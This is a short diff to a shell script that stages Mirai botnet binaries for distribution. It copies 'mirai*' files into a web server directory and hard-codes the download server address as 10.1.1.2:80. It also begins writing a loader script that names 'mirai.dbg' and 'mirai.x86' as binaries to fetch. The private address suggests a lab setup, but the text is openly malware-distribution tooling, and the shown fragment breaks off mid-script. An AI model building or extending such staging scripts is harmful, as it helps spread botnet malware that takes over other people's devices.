@@ -1,12 +1,9 @@
-read -p "Web server ip: " SERVER_IP
-
 mkdir /var/www/html/bins
-cp mirai* /var/www/html/bins
+cp /home/debug/mirai* /var/www/html/bins
 
 echo "#!/bin/sh
  
-WEBSERVER=\"$SERVER_IP:80\"
- 
+WEBSERVER=\"10.1.1.2:80\"
  
 BINARIES=\"mirai.dbg mirai.x86\"
  
